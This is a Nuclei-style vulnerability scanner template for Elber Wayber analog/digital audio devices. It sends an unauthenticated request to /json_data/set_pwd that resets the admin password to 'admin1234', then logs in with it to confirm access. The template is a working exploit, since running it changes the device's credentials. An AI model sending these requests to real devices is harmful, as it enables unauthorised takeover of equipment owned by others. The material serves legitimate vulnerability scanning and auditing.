id: poc-yaml-elber-wayber-analog-digital-audio-password-reset
info:
  name: Elber Wayber Analog Digital Audio Password Reset Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
  description: |
    This template identifies an access control vulnerability in Elber Wayber Analog Digital Audio systems that allows unauthorized password resets.
http:
  - raw:
      - |
        GET /json_data/set_pwd?lev=2&pass=admin1234 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Apply successfully"
  - raw:
      - |
        GET /json_data/login?username=admin&password=admin1234 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "\\\"name\\\"\\s*:\\s*\\\"admin\\\""
